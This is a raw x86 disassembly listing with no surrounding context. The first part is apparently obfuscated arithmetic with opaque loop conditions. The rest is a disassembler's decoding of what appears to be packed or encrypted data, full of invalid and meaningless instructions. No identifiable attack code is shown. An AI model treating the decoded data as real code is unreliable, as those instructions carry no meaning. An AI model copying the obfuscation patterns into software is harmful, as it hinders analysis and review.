  4125a0:	lea    edx,[ebx+edx*1+0x5708f8]
  4125a7:	mov    DWORD PTR [ebp-0x58],edx
  4125aa:	mov    edx,DWORD PTR [ebp+0x8]
  4125ad:	mov    ebx,DWORD PTR [ebp-0x54]
  4125b0:	add    edx,0x64f89a
  4125b6:	imul   edx,ebx
  4125b9:	mov    DWORD PTR [ebp-0x54],edx
  4125bc:	mov    edx,DWORD PTR [ebp+0x8]
  4125bf:	mov    ebx,DWORD PTR [ebp-0x50]
  4125c2:	add    edx,0x242ebed
  4125c8:	and    edx,ebx
  4125ca:	mov    DWORD PTR [ebp-0x50],edx
  4125cd:	mov    edx,DWORD PTR [ebp+0x8]
  4125d0:	mov    ebx,DWORD PTR [ebp-0x4c]
  4125d3:	add    edx,ecx
  4125d5:	or     edx,ebx
  4125d7:	mov    DWORD PTR [ebp-0x4c],edx
  4125da:	mov    edx,DWORD PTR [ebp+0x8]
  4125dd:	mov    ebx,0xfdbe0321
  4125e2:	sub    ebx,edx
  4125e4:	add    ebx,DWORD PTR [ebp-0x48]
  4125e7:	mov    DWORD PTR [ebp-0x48],ebx
  4125ea:	mov    edx,DWORD PTR [ebp+0x8]
  4125ed:	mov    ebx,DWORD PTR [ebp-0x44]
  4125f0:	add    edx,edi
  4125f2:	xor    edx,ebx
  4125f4:	mov    DWORD PTR [ebp-0x44],edx
  4125f7:	mov    edx,DWORD PTR [ebp+0x8]
  4125fa:	xor    edx,eax
  4125fc:	add    edx,esi
  4125fe:	jne    0x412587
  412604:	mov    edx,DWORD PTR [ebp-0x8]
  412607:	mov    ebx,DWORD PTR [ebp-0xc]
  41260a:	xor    edx,eax
  41260c:	lea    edx,[edx+ebx*1+0x3272f8]
  412613:	mov    DWORD PTR [ebp-0xc],edx
  412616:	mov    edx,DWORD PTR [ebp-0x10]
  412619:	xor    edx,eax
  41261b:	add    edx,esi
  41261d:	jne    0x4122e0
  412623:	jmp    0x414ab3
  412628:	mov    ecx,DWORD PTR [ebp-0x14]
  41262b:	mov    DWORD PTR [ebp+0x8],ecx
  41262e:	jmp    0x4126a7
  412633:	mov    ecx,DWORD PTR [ebp+0x8]
  412636:	mov    edx,DWORD PTR [ebp-0x8]
  412639:	xor    ecx,eax
  41263b:	xor    edx,eax
  41263d:	sub    ecx,edx
  41263f:	sub    ecx,esi
  412641:	xor    ecx,eax
  412643:	mov    DWORD PTR [ebp+0x8],ecx
  412646:	mov    ecx,DWORD PTR [ebp+0x8]
  412649:	mov    edx,DWORD PTR [ebp-0x58]
  41264c:	lea    ecx,[edx+ecx*1+0x5708f8]
  412653:	mov    DWORD PTR [ebp-0x58],ecx
  412656:	mov    ecx,DWORD PTR [ebp+0x8]
  412659:	mov    edx,DWORD PTR [ebp-0x54]
  41265c:	add    ecx,0x64f89a
  412662:	imul   ecx,edx
  412665:	mov    DWORD PTR [ebp-0x54],ecx
  412668:	mov    ecx,DWORD PTR [ebp+0x8]
  41266b:	mov    edx,DWORD PTR [ebp-0x50]
  41266e:	add    ecx,0x242ebed
  412674:	and    ecx,edx
  412676:	mov    DWORD PTR [ebp-0x50],ecx
  412679:	mov    ecx,DWORD PTR [ebp+0x8]
  41267c:	mov    edx,DWORD PTR [ebp-0x4c]
  41267f:	add    ecx,0xf641bea
  412685:	or     ecx,edx
  412687:	mov    DWORD PTR [ebp-0x4c],ecx
  41268a:	mov    ecx,DWORD PTR [ebp+0x8]
  41268d:	mov    edx,0xfdbe0321
  412692:	sub    edx,ecx
  412694:	add    edx,DWORD PTR [ebp-0x48]
  412697:	mov    DWORD PTR [ebp-0x48],edx
  41269a:	mov    ecx,DWORD PTR [ebp+0x8]
  41269d:	mov    edx,DWORD PTR [ebp-0x44]
  4126a0:	add    ecx,edi
  4126a2:	xor    ecx,edx
  4126a4:	mov    DWORD PTR [ebp-0x44],ecx
  4126a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4126aa:	xor    ecx,eax
  4126ac:	add    ecx,esi
  4126ae:	jne    0x412633
  4126b4:	jmp    0x414abf
  4126b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4126bc:	mov    edx,DWORD PTR [ebp-0x8]
  4126bf:	xor    ecx,eax
  4126c1:	xor    edx,eax
  4126c3:	sub    ecx,edx
  4126c5:	sub    ecx,esi
  4126c7:	xor    ecx,eax
  4126c9:	mov    DWORD PTR [ebp+0x8],ecx
  4126cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4126cf:	mov    edx,DWORD PTR [ebp-0x58]
  4126d2:	lea    ecx,[edx+ecx*1+0x5708f8]
  4126d9:	mov    DWORD PTR [ebp-0x58],ecx
  4126dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4126df:	mov    edx,DWORD PTR [ebp-0x54]
  4126e2:	add    ecx,0x64f89a
  4126e8:	imul   ecx,edx
  4126eb:	mov    DWORD PTR [ebp-0x54],ecx
  4126ee:	mov    ecx,DWORD PTR [ebp+0x8]
  4126f1:	mov    edx,DWORD PTR [ebp-0x50]
  4126f4:	add    ecx,0x242ebed
  4126fa:	and    ecx,edx
  4126fc:	mov    DWORD PTR [ebp-0x50],ecx
  4126ff:	mov    ecx,DWORD PTR [ebp+0x8]
  412702:	mov    edx,DWORD PTR [ebp-0x4c]
  412705:	add    ecx,0xf641bea
  41270b:	or     ecx,edx
  41270d:	jmp    0x414a86
  412712:	enter  0xa3a8,0x29
  412716:	jecxz  0x412742
  412718:	dec    edx
  412719:	push   0xffffff84
  41271b:	add    al,0xed
  41271d:	xlat   BYTE PTR ds:[ebx]
  41271e:	int3   
  41271f:	and    eax,0x720e9159
  412724:	jnp    0x4127a1
  412726:	xlat   BYTE PTR ds:[ebx]
  412727:	sahf   
  412728:	jnp    0x4127a5
  41272a:	in     al,dx
  41272b:	add    eax,0x15c96e2b
  412730:	icebp  
  412731:	cwde   
  412732:	xor    eax,0xb4fa0c8d
  412737:	in     eax,dx
  412738:	icebp  
  412739:	sbb    DWORD PTR [eax+0x51c1cf43],ebx
  41273f:	mov    edi,0x2d322e31
  412744:	pusha  
  412745:	mov    ds:0x22e2fa10,al
  41274a:	ins    DWORD PTR es:[edi],dx
  41274b:	mov    esp,0x25aaaa0e
  412750:	clc    
  412751:	neg    edx
  412753:	shl    al,cl
  412755:	mul    DWORD PTR [eax]
  412757:	leave  
  412758:	mov    edx,0xcf74b0a0
  41275d:	inc    esp
  41275e:	stc    
  41275f:	shr    BYTE PTR [ecx-0x7b51c527],0xee
  412766:	mov    cl,0x34
  412768:	std    
  412769:	cmp    bh,BYTE PTR [eax-0x20]
  41276c:	xlat   BYTE PTR ds:[ebx]
  41276d:	popf   
  41276e:	cmp    eax,0x1f3fe532
  412773:	xor    esp,eax
  412775:	mov    WORD PTR [ebx],ds
  412777:	inc    esp
  412778:	in     al,0xab
  41277a:	sub    DWORD PTR [ecx+0xb],esp
  41277d:	xchg   BYTE PTR [ecx],ch
  41277f:	pop    esp
  412780:	inc    esp
  412781:	or     BYTE PTR [edx-0x5140ea40],0x7b
  412788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412789:	aam    0xe
  41278b:	push   ecx
  41278c:	inc    ebp
  41278d:	dec    eax
  41278e:	jl     0x41276d
  412790:	sbb    ah,ch
  412792:	sbb    DWORD PTR [eax],edx
  412794:	pop    eax
  412795:	inc    ebx
  412796:	cmp    DWORD PTR [esi+0x4d24aca3],edi
  41279c:	or     al,0x83
  41279e:	xchg   ecx,eax
  41279f:	mov    ss,esi
  4127a1:	add    DWORD PTR [ebp-0x20],ebp
  4127a4:	dec    edi
  4127a5:	stos   BYTE PTR es:[edi],al
  4127a6:	in     al,dx
  4127a7:	pusha  
  4127a8:	aaa    
  4127a9:	jge    0x4127b1
  4127ab:	jnp    0x4127f0
  4127ad:	inc    edx
  4127ae:	push   esi
  4127af:	push   eax
  4127b0:	ja     0x412767
  4127b2:	scas   eax,DWORD PTR es:[edi]
  4127b3:	in     eax,0xb2
  4127b5:	xchg   ebp,eax
  4127b6:	data16 and bh,BYTE PTR [ebx]
  4127b9:	fwait
  4127ba:	inc    esi
  4127bb:	xchg   DWORD PTR [eax-0x525b9981],ecx
  4127c1:	and    ah,ch
  4127c3:	cmp    ch,ah
  4127c5:	jecxz  0x41280e
  4127c7:	das    
  4127c8:	sub    eax,0xc4cf6dd7
  4127cd:	test   al,0x9d
  4127cf:	xchg   esp,eax
  4127d0:	xor    edx,edx
  4127d2:	mov    ds:0xdeecc5fa,eax
  4127d7:	mov    esi,0x7981216f
  4127dc:	das    
  4127dd:	mov    eax,0xf674258f
  4127e2:	push   cs
  4127e3:	and    dh,BYTE PTR [edi+0x58]
  4127e6:	rcl    BYTE PTR fs:0xbd9b579b,1
  4127ed:	inc    ecx
  4127ee:	pop    ds
  4127ef:	cmp    BYTE PTR [eax+0xe],cl
  4127f2:	in     al,dx
  4127f3:	js     0x4127d9
  4127f5:	icebp  
  4127f6:	sub    eax,0x35816bb0
  4127fb:	fwait
  4127fc:	mov    al,ds:0x69d44c4a
  412801:	and    eax,0xfdb6baf7
  412806:	mov    eax,0xd6a5609d
  41280b:	iret   
  41280c:	gs or  dh,dl
  41280f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412810:	cdq    
  412811:	dec    esi
  412812:	dec    ebp
  412813:	test   eax,0xce2bcb49
  412818:	dec    ebx
  412819:	ret    0x3857
  41281c:	mov    dl,bh
  41281e:	out    0x8c,al
  412820:	dec    edx
  412821:	sahf   
  412822:	mov    edx,ebx
  412824:	add    BYTE PTR [edx-0x76],dl
  412827:	push   ss
  412828:	fsubr  QWORD PTR [ecx*1-0x5fbf71e3]
  41282f:	call   0x8f79:0xad7cac6d
  412836:	cmp    eax,0x40857418
  41283b:	nop
  41283c:	fsubrp st(1),st
  41283e:	push   esp
  41283f:	jecxz  0x412825
  412841:	and    al,0x44
  412843:	lds    ebp,FWORD PTR [eax-0x3d]
  412846:	mov    ecx,ecx
  412848:	pop    es
  412849:	push   ebx
  41284a:	and    al,0xf0
  41284c:	sbb    BYTE PTR [edx+0x2c],bl
  41284f:	jp     0x412807
  412851:	scas   eax,DWORD PTR es:[edi]
  412852:	xchg   edi,eax
  412853:	mov    ah,0xdf
  412855:	outs   dx,BYTE PTR ds:[esi]
  412856:	nop
  412857:	push   ss
  412858:	xor    al,0x6b
  41285a:	hlt    
  41285b:	add    ebx,DWORD PTR [ecx+0x4f]
  41285e:	cdq    
  41285f:	dec    ebx
  412860:	jo     0x4127f7
  412862:	ror    DWORD PTR [ebx+0x4f],0x65
  412866:	fld    DWORD PTR [ebx]
  412868:	out    dx,eax
  412869:	es scas al,BYTE PTR es:[edi]
  41286b:	repnz mov al,ds:0xc57fccef
  412871:	push   eax
  412872:	(bad)  
  412874:	pop    es
  412875:	push   0xa2a50a1b
  41287a:	xor    edx,DWORD PTR [esi+eax*2+0x488012dd]
  412881:	push   es
  412882:	fsubr  QWORD PTR [esp+ebx*4+0x1441930e]
  412889:	cmp    ebp,DWORD PTR cs:[ebp+eax*2+0x6775b5e8]
  412891:	sbb    cl,dh
  412893:	mov    esi,0x1ddbeca8
  412898:	cmp    eax,DWORD PTR [ecx-0x28]
  41289b:	push   es
  41289c:	jl     0x41283b
  41289e:	mov    DWORD PTR [ecx],esp
  4128a0:	inc    edx
  4128a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128a2:	mov    dh,0x91
  4128a4:	jge    0x412846
  4128a6:	mov    eax,0x24f2954c
  4128ab:	(bad)  
  4128ad:	arpl   WORD PTR [ecx-0x22244e9a],ax
  4128b3:	mov    edx,0xfb6c6a2d
  4128b8:	lock pop ds
  4128ba:	and    eax,0x4d86e4b3
  4128bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128c0:	xlat   BYTE PTR ds:[ebx]
  4128c1:	dec    esi
  4128c2:	rol    ebx,1
  4128c4:	xchg   ecx,eax
  4128c5:	mov    es,WORD PTR [ecx]
  4128c7:	mov    ds:0xfd7090a,eax
  4128cc:	shl    bl,1
  4128ce:	inc    esi
  4128cf:	add    dh,BYTE PTR [esi+ebp*1+0xbffd5b6]
  4128d6:	mov    edx,0x4f30b3ec
  4128db:	pop    ecx
  4128dc:	mov    al,ds:0x97c95f88
  4128e1:	add    BYTE PTR [edx],bl
  4128e3:	sbb    edi,DWORD PTR [eax-0x1168709d]
  4128e9:	fs call 0x3c79:0x872c7b3e
  4128f1:	inc    ebx
  4128f2:	xchg   ebx,eax
  4128f3:	inc    esi
  4128f4:	cwde   
  4128f5:	xchg   ebp,eax
  4128f6:	xor    BYTE PTR [esp+eax*1],ch
  4128f9:	push   0x6a
  4128fb:	jge    0x41289d
  4128fd:	das    
  4128fe:	inc    ecx
  4128ff:	dec    esp
  412900:	xchg   esi,eax
  412901:	shl    BYTE PTR [ebx],1
  412903:	jg     0x41294d
  412905:	fwait
  412906:	icebp  
  412907:	jl     0x4128e7
  412909:	xor    DWORD PTR [edi+0x78b518e4],ebx
  41290f:	std    
  412910:	dec    ebp
  412911:	inc    eax
  412912:	gs xor eax,0x33ae23a0
  412918:	clc    
  412919:	aas    
  41291a:	repz loopne 0x41294f
  41291d:	mov    ah,0xc4
  41291f:	mov    ecx,0x32374150
  412924:	std    
  412925:	bound  eax,QWORD PTR [eax-0x54016a1b]
  41292b:	jl     0x41292d
  41292d:	mov    edx,0x7200d0
  412932:	(bad)  
  412933:	pop    eax
  412934:	cmp    esi,edx
  412936:	xchg   esi,eax
  412937:	and    eax,0xc8598c2b
  41293c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41293d:	stos   DWORD PTR es:[edi],eax
  41293e:	jns    0x412984
  412940:	xchg   DWORD PTR [eax],esi
  412942:	jbe    0x41296f
  412944:	or     esp,0x8f1f776a
  41294a:	retf   
  41294b:	pop    ds
  41294c:	push   ecx
  41294d:	add    al,0xc9
  41294f:	mov    eax,ds:0x3e491780
  412954:	fwait
  412955:	adc    dl,dh
  412957:	bnd jp 0x41290a
  41295a:	les    edx,FWORD PTR [ebx+eiz*2-0x49d62d21]
  412961:	add    BYTE PTR [ebx+0x51],bl
  412964:	cmp    BYTE PTR [edi],cl
  412966:	jns    0x41292c
  412968:	cmp    al,0xbe
  41296a:	pop    ecx
  41296b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41296c:	jle    0x4129e4
  41296e:	jnp    0x15041614
  412974:	rol    BYTE PTR [ebx+eiz*4+0x348ac1af],0xab
  41297c:	leave  
  41297d:	pop    ss
  41297e:	test   al,ch
  412980:	mov    ds:0x5ad7819d,eax
  412985:	ret    
  412986:	aas    
  412987:	and    BYTE PTR [ecx+0x7f],cl
  41298a:	std    
  41298b:	push   cs
  41298c:	push   es
  41298d:	or     al,0x9c
  41298f:	adc    DWORD PTR [edx],ecx
  412991:	adc    al,0x36
  412993:	jmp    0x41299c
  412995:	jmp    0x601d:0x23d84722
  41299c:	test   eax,0xbbf5db4
  4129a1:	loope  0x41293a
  4129a3:	lods   eax,DWORD PTR ds:[esi]
  4129a4:	popa   
  4129a5:	xor    eax,0x832fe3a4
  4129aa:	sub    BYTE PTR [ecx-0x16],0xff
  4129ae:	push   0x141e1644
  4129b3:	adc    al,0x5f
  4129b5:	jl     0x412a1b
  4129b7:	scas   al,BYTE PTR es:[edi]
  4129b8:	outs   dx,BYTE PTR ds:[esi]
  4129b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ba:	inc    ebp
  4129bb:	not    DWORD PTR [edx]
  4129bd:	pushf  
  4129be:	lahf   
  4129bf:	enter  0x1832,0xae
  4129c3:	or     DWORD PTR [ebx-0x5a],edx
  4129c6:	pop    eax
  4129c7:	adc    esi,DWORD PTR [edi-0x72640937]
  4129cd:	test   BYTE PTR fs:[edi+edi*2],0x58
  4129d2:	adc    DWORD PTR [ecx],ebp
  4129d4:	add    ch,al
  4129d6:	into   
  4129d7:	outs   dx,DWORD PTR ds:[esi]
  4129d8:	ins    BYTE PTR es:[edi],dx
  4129d9:	fs xchg edx,eax
  4129db:	adc    edx,edx
  4129dd:	aam    0x55
  4129df:	enter  0x341,0xb
  4129e3:	fwait
  4129e4:	mov    edx,0xf6bfaec7
  4129e9:	int3   
  4129ea:	mov    ecx,DWORD PTR [ecx]
  4129ec:	sbb    al,0x61
  4129ee:	in     eax,0x4e
  4129f0:	clc    
  4129f1:	push   0xffffffbd
  4129f3:	and    BYTE PTR [edx-0x66],dl
  4129f6:	pushf  
  4129f7:	add    ah,dh
  4129f9:	(bad)  
  4129fa:	rcr    DWORD PTR [eax+0x249cfc59],0xd9
  412a01:	cld    
  412a02:	add    eax,0x6e459c0
  412a07:	mov    ecx,0xbdece028
  412a0c:	xor    bl,bh
  412a0e:	mov    fs,WORD PTR [ecx-0x33a63588]
  412a14:	std    
  412a15:	(bad)  
  412a16:	jecxz  0x412a66
  412a18:	mov    cl,0x66
  412a1a:	xchg   ebp,eax
  412a1b:	(bad)  
  412a1c:	cld    
  412a1d:	imul   edx,DWORD PTR [ecx+0x5f9704b1],0x9a75df4e
  412a27:	inc    esp
  412a28:	fistp  DWORD PTR [eax]
  412a2a:	mov    DWORD PTR [ecx],esi
  412a2c:	(bad)  
  412a2d:	sbb    eax,0xd9676718
  412a32:	mov    WORD PTR ds:[ebx+0x67438463],cs
  412a39:	or     edx,ebx
  412a3b:	jno    0x4129d8
  412a3d:	mov    esi,0x2968b0e6
  412a42:	jo     0x412a84
  412a44:	mov    cl,0x7c
  412a46:	enter  0x4cbc,0x17
  412a4a:	mov    eax,0x2aec4747
  412a4f:	dec    edi
  412a50:	mov    ebx,0x853500be
  412a55:	xchg   ebp,eax
  412a56:	idiv   DWORD PTR [ebx]
  412a58:	sub    eax,0x4f09ea3a
  412a5d:	xchg   BYTE PTR [esi+0x7c],al
  412a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a61:	loope  0x412ac5
  412a63:	(bad)  
  412a64:	retf   
  412a65:	pop    ebp
  412a66:	int3   
  412a67:	xor    ah,BYTE PTR [ebx+0x78]
  412a6a:	xchg   esi,eax
  412a6b:	popa   
  412a6c:	js     0x412aed
  412a6e:	shl    DWORD PTR [esi],cl
  412a70:	mov    cl,0xcd
  412a72:	mov    cl,0x5f
  412a74:	loop   0x412a74
  412a76:	push   ecx
  412a77:	loope  0x412a13
  412a79:	sub    bh,ah
  412a7b:	dec    eax
  412a7c:	jecxz  0x412a46
  412a7e:	inc    esp
  412a7f:	retf   0x8adf
  412a82:	loop   0x412adc
  412a84:	mov    dh,0x23
  412a86:	lds    ebp,FWORD PTR [ebx+0x54]
  412a89:	xchg   ebp,eax
  412a8a:	or     BYTE PTR [ecx+0x1a],bh
  412a8d:	adc    eax,0x21438864
  412a92:	scas   al,BYTE PTR es:[edi]
  412a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a94:	and    eax,DWORD PTR [edx-0x4b]
  412a97:	(bad)  
  412a98:	fistp  QWORD PTR [edi+eax*1]
  412a9b:	movq   QWORD PTR [eax],mm5
  412a9e:	(bad)  
  412a9f:	retf   0xe9f4
  412aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa3:	xchg   esi,eax
  412aa4:	xor    dh,BYTE PTR [eax]
  412aa6:	out    dx,eax
  412aa7:	xchg   dh,bl
  412aa9:	sub    ebx,DWORD PTR [ebp+0x3f]
  412aac:	mov    bl,0x2f
  412aae:	fsub   DWORD PTR [esi+0x5008b76a]
  412ab4:	nop
  412ab5:	lahf   
  412ab6:	bts    ecx,ecx
  412ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aba:	outs   dx,BYTE PTR ds:[esi]
  412abb:	sti    
  412abc:	lods   al,BYTE PTR ds:[esi]
  412abd:	(bad)  
  412abf:	add    eax,0x1bd4f7fb
  412ac4:	out    dx,al
  412ac5:	outs   dx,DWORD PTR ds:[esi]
  412ac6:	adc    cl,BYTE PTR [ebp-0x692303dd]
  412acc:	jno    0x412b19
  412ace:	scas   eax,DWORD PTR es:[edi]
  412acf:	shl    BYTE PTR [ebp-0x59],1
  412ad2:	jle    0x412b3a
  412ad4:	jmp    0xc77d:0x3c627b09
  412adb:	push   0x68
  412add:	xchg   ebx,eax
  412ade:	sbb    BYTE PTR [eax],ah
  412ae0:	add    al,0x28
  412ae2:	pop    ds
  412ae3:	cwde   
  412ae4:	inc    ecx
  412ae5:	test   eax,0x679e72a3
  412aea:	pop    edi
  412aeb:	jle    0x412ab3
  412aed:	scas   eax,DWORD PTR es:[edi]
  412aee:	fist   DWORD PTR [esi]
  412af0:	xchg   esp,eax
  412af1:	sub    bl,BYTE PTR [esi-0x7c]
  412af4:	mov    ch,ch
  412af6:	pushf  
  412af7:	inc    esi
  412af8:	cmp    bl,BYTE PTR [ecx+0x25]
  412afb:	cmp    BYTE PTR [ecx],bh
  412afd:	test   esi,0xf8d1dd75
  412b03:	adc    BYTE PTR [ecx-0x19620421],al
  412b09:	rcr    DWORD PTR [ecx-0x28c7f99],cl
  412b0f:	xor    DWORD PTR [ebp+0x4fb0de5b],edi
  412b15:	xchg   DWORD PTR [esi+eax*8],ebx
  412b18:	and    al,0x59
  412b1a:	xchg   esp,eax
  412b1b:	and    ch,cl
  412b1d:	mov    WORD PTR [ebx+0x5e],?
  412b20:	pop    edx
  412b21:	(bad)  
  412b22:	push   eax
  412b23:	mov    bh,0xc7
  412b25:	mov    esi,ebp
  412b27:	cld    
  412b28:	ret    
  412b29:	mov    eax,0x42c15d2
  412b2e:	sbb    al,0x1a
  412b30:	stos   DWORD PTR es:[edi],eax
  412b31:	jmp    0x412aff
  412b33:	push   0xffffffe2
  412b35:	mov    ah,0xcb
  412b37:	xchg   edi,eax
  412b38:	inc    esp
  412b39:	in     eax,0x21
  412b3b:	mov    eax,0xd0ffc247
  412b40:	adc    edx,DWORD PTR ds:0x7770ab65
  412b46:	(bad)  
  412b47:	fucomip st,st(6)
  412b49:	cwde   
  412b4a:	jmp    0x78943ef9
  412b4f:	iret   
  412b50:	loop   0x412b12
  412b52:	jnp    0x412af8
  412b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b55:	push   es
  412b56:	jge    0x412b97
  412b58:	js     0x412b6e
  412b5a:	dec    eax
  412b5b:	or     BYTE PTR [ecx+0xd],ah
  412b5e:	pop    ds
  412b5f:	add    eax,0x9131ec05
  412b64:	fisubr DWORD PTR [eax+0xf]
  412b67:	out    dx,al
  412b68:	test   BYTE PTR [ebx+0x6e80dd77],ch
  412b6e:	mov    WORD PTR [eax],es
  412b70:	inc    ebx
  412b71:	xor    eax,0x6a90b0dd
  412b76:	jns    0x412b28
  412b78:	xchg   edx,eax
  412b79:	add    al,0x81
  412b7b:	mov    ah,0x1f
  412b7d:	mov    ds,WORD PTR ds:0xcc4f4e7b
  412b83:	aad    0x74
  412b85:	jp     0x412bef
  412b87:	add    al,0xf0
  412b89:	push   ds
  412b8a:	xchg   WORD PTR [edx],ax
  412b8d:	imul   ecx,ecx,0xa
  412b90:	mov    ds:0x57d45ecd,eax
  412b95:	cmp    esp,DWORD PTR [eax]
  412b97:	pop    ebp
  412b98:	mov    ss,WORD PTR [ecx]
  412b9a:	adc    cl,BYTE PTR [eax-0x7a]
  412b9d:	mov    al,ds:0x2b5943fc
  412ba2:	push   esi
  412ba3:	xchg   ecx,eax
  412ba4:	push   ebp
  412ba5:	pop    edx
  412ba6:	xchg   ebx,eax
  412ba7:	addr16 sbb al,0x6a
  412baa:	inc    ecx
  412bab:	shr    BYTE PTR [ebx-0x5acd9e45],cl
  412bb1:	jmp    0x942317c9
  412bb6:	out    0x8e,eax
  412bb8:	hlt    
  412bb9:	ror    DWORD PTR [eax],0xcc
  412bbc:	mov    cl,0x12
  412bbe:	mov    eax,0xa592ce05
  412bc4:	fs addr16 out dx,eax
  412bc7:	fbld   TBYTE PTR [edi+ebp*4+0x794179d0]
  412bce:	or     BYTE PTR [edx-0x20],dl
  412bd1:	inc    ebx
  412bd2:	mov    edx,0x933e30a9
  412bd7:	jae    0x412c4d
  412bd9:	push   0x27dc6ed3
  412bde:	xor    eax,0xe5fc9cad
  412be3:	rol    DWORD PTR [esi+0x7f2ff151],cl
  412be9:	gs dec eax
  412beb:	sti    
  412bec:	js     0x412c0e
  412bee:	push   cs
  412bef:	or     ecx,DWORD PTR [ebx+eiz*4]
  412bf2:	in     al,dx
  412bf3:	mov    ah,0x5c
  412bf5:	xlat   BYTE PTR ds:[ebx]
  412bf6:	iret   
  412bf7:	push   es
  412bf8:	jg     0x412b94
  412bfa:	inc    ebp
  412bfb:	dec    esp
  412bfc:	jg     0x412c3c
  412bfe:	cld    
  412bff:	call   0xa6f2:0xce775919
  412c06:	pusha  
  412c07:	mov    eax,ds:0x879981ba
  412c0c:	inc    edi
  412c0d:	stos   DWORD PTR es:[edi],eax
  412c0e:	mov    ch,0xfc
  412c10:	cli    
  412c11:	shl    DWORD PTR [edi+ebx*4+0x45],0x22
  412c16:	dec    esi
  412c17:	or     ebx,DWORD PTR ds:0x4b62da12
  412c1d:	dec    ebp
  412c1e:	in     eax,0x5a
  412c20:	and    BYTE PTR [eax-0x26565c24],al
  412c26:	or     ecx,DWORD PTR [edx-0x28]
  412c29:	cmp    al,0x44
  412c2b:	arpl   ax,bx
  412c2d:	sub    eax,ebx
  412c2f:	in     al,dx
  412c30:	cwde   
  412c31:	jmp    0x412bc9
  412c33:	into   
  412c34:	out    0x51,al
  412c36:	ror    BYTE PTR [ecx],cl
  412c38:	and    DWORD PTR [esi-0x526e2e22],ebp
  412c3e:	iret   
  412c3f:	inc    edx
  412c40:	leave  
  412c41:	stc    
  412c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c43:	fs enter 0x1424,0xf8
  412c48:	mov    dl,0x92
  412c4a:	test   BYTE PTR [ecx],bh
  412c4c:	enter  0x1ede,0x9a
  412c50:	xor    eax,edi
  412c52:	nop
  412c53:	jp     0x412c13
  412c55:	push   edx
  412c56:	sar    DWORD PTR [esi+0x43f802e4],1
  412c5c:	cmp    eax,0x87cf7880
  412c61:	jbe    0x412c66
  412c63:	xchg   DWORD PTR [edi+0x37],esi
  412c66:	ret    
  412c67:	add    BYTE PTR [esi+0x5a],0x49
  412c6b:	mov    edx,0x2f8f96f0
  412c70:	sub    al,0x71
  412c72:	mov    dh,bl
  412c74:	mov    ds:0xaced157,eax
  412c79:	mov    ebp,0xaa8240d4
  412c7e:	sahf   
  412c7f:	mov    ecx,0x389b8645
  412c84:	aas    
  412c85:	rol    DWORD PTR [ebp+0x36e5d47d],1
  412c8b:	enter  0xc2a5,0x52
  412c8f:	fcomp  st(2)
  412c91:	xor    DWORD PTR [ecx-0x3b7d3daa],esi
  412c97:	scas   eax,DWORD PTR es:[edi]
  412c98:	dec    esp
  412c99:	inc    edi
  412c9a:	jmp    0x412d11
  412c9c:	call   0xd516:0x17ef1738
  412ca3:	add    eax,0xc69b8cf2
  412ca8:	inc    edi
  412ca9:	and    BYTE PTR [eax-0x15014d6b],0x19
  412cb0:	or     bl,BYTE PTR [ecx-0x32d93036]
  412cb6:	sbb    al,0xd
  412cb8:	ds sub eax,0xa8c39350
  412cbe:	fcmovnb st,st(7)
  412cc0:	sbb    eax,0xf98da602
  412cc5:	stos   DWORD PTR es:[edi],eax
  412cc6:	jg     0x412d29
  412cc8:	mov    ch,0xad
  412cca:	push   esi
  412ccb:	mov    cl,0x7b
  412ccd:	aaa    
  412cce:	mov    dl,0x82
  412cd0:	xor    edx,DWORD PTR [edx]
  412cd2:	ins    DWORD PTR es:[edi],dx
  412cd3:	sub    BYTE PTR [edx],cl
  412cd5:	cmp    edx,DWORD PTR [ebp+0x4c609d7e]
  412cdb:	sbb    al,0x2c
  412cdd:	repz xor ebx,esi
  412ce0:	mov    al,0x4f
  412ce2:	cmp    eax,0x7f19d12e
  412ce7:	xor    eax,0x49134f05
  412cec:	scas   eax,DWORD PTR es:[edi]
  412ced:	data16 test dl,bh
  412cf0:	xchg   ebp,edi
  412cf2:	aam    0x25
  412cf4:	jnp    0x412cd6
  412cf6:	lock pop ecx
  412cf8:	loop   0x412c85
  412cfa:	popa   
  412cfb:	cld    
  412cfc:	mov    ds:0x354123ac,eax
  412d01:	fwait
  412d02:	ins    DWORD PTR es:[edi],dx
  412d03:	mov    bl,0x56
  412d05:	push   ebx
  412d06:	sbb    BYTE PTR [eax],al
  412d08:	lea    ebx,[esi]
  412d0a:	sub    bl,BYTE PTR [ebp-0x46286d5a]
  412d10:	in     al,dx
  412d11:	mov    al,ds:0x44ea4b39
  412d16:	fst    QWORD PTR [edx+0x5fae76a]
  412d1c:	or     edx,DWORD PTR [esi+ebx*8]
  412d1f:	adc    BYTE PTR [eax+ebx*1+0x20],dl
  412d23:	jmp    0xdd9f2227
  412d28:	jmp    0x8a01:0xb3247847
  412d2f:	mov    eax,ds:0x51f6f417
  412d34:	pop    ebx
  412d35:	dec    edi
  412d36:	call   eax
  412d38:	mov    dl,0x84
  412d3a:	cwde   
  412d3b:	or     eax,0xe900f660
  412d40:	xchg   edi,eax
  412d41:	mov    dl,0xdf
  412d43:	ins    DWORD PTR es:[edi],dx
  412d44:	jbe    0x412cee
  412d46:	push   edi
  412d47:	into   
  412d48:	fist   WORD PTR [bp+si-0x5259]
  412d4d:	jno    0x412d00
  412d4f:	push   eax
  412d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d51:	mov    ah,0x65
  412d53:	adc    al,BYTE PTR [ecx+0x75]
  412d56:	mov    esi,0x6d0ed216
  412d5b:	and    dl,ch
  412d5d:	aaa    
  412d5e:	xchg   ebx,eax
  412d5f:	jmp    0x412d98
